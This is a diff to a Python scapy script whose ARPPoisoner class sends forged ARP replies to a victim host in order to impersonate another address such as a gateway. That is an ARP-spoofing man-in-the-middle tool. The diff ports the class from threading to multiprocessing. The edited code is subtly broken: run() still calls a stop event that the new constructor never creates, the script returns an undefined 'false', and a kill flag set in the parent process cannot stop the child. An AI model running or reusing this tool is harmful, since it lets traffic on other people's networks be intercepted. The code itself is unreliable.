@@ -1,18 +1,18 @@
 #!/usr/bin/env python
 
 from scapy.all import *
-import threading
+from multiprocessing import Process
 import sys
 
-class ARPPoisoner(threading.Thread):
-    def __init__(self, victimIp = '0.0.0.0', usurpedIp = '192.168.1.1', interface = 'eth0'):
+class ARPPoisoner(Process):
+    def __init__(self, victimIp, usurpedIp, interface):
+        super(ARPPoisoner, self).__init__()
         self.victimIp = victimIp
         self.usurpedIp = usurpedIp
-        self.interface = 'eth0'
-        threading.Thread.__init__(self)
-        self.__stopped = threading.Event()
-        self.victimHwAddr = self.getHwAddrVictim()
-        self.usurpedHwAddr = self.getHwAddrUsurped()
+        self.interface = interface
+        self.getHwAddrVictim()
+        self.kill = False
+        self.getHwAddrUsurped()
 
 
     def __getHwaddr(self, ip):
@@ -21,11 +21,6 @@ class ARPPoisoner(threading.Thread):
             if received[ARP].hwsrc:
                 return received[ARP].hwsrc
         return false;
-
-    def __restoreNetwork(self):
-        send(ARP(op=2, pdst=self.usurpedIp, hwdst="ff:ff:ff:ff:ff:ff", psrc=self.victimIp, hwsrc=self.victimHwAddr), verbose=0)
-        send(ARP(op=2, pdst=self.victimIp, hwdst="ff:ff:ff:ff:ff:ff", psrc=self.usurpedIp, hwsrc=self.usurpedHwAddr), verbose=0)
-        print("Restoring Network")
 
     def getHwAddrVictim(self):
         self.victimHwAddr = self.__getHwaddr(self.victimIp)
@@ -40,14 +35,15 @@ class ARPPoisoner(threading.Thread):
         send(ARP(op=2, pdst=self.victimIp, hwdst=self.victimHwAddr, psrc=self.usurpedIp), verbose=0)
 
     def run(self):
-       while not self.__stopped.isSet():
+        while not self.kill:
             self.usurp()
             self.__stopped.wait(1.0)
-       print('return ARP run')
 
     def stop(self):
-        self.__stopped.set()
-        self.__restoreNetwork()
+        self.kill = True
+        send(ARP(op=2, pdst=self.usurpedIp, hwdst="ff:ff:ff:ff:ff:ff", psrc=self.victimIp, hwsrc=self.victimHwAddr), verbose=0)
+        send(ARP(op=2, pdst=self.victimIp, hwdst="ff:ff:ff:ff:ff:ff", psrc=self.usurpedIp, hwsrc=self.usurpedHwAddr), verbose=0)
+        print(" -- Stopping ArpPoisoner")
 
 if __name__ == '__main__':
     if len(sys.argv) < 3:
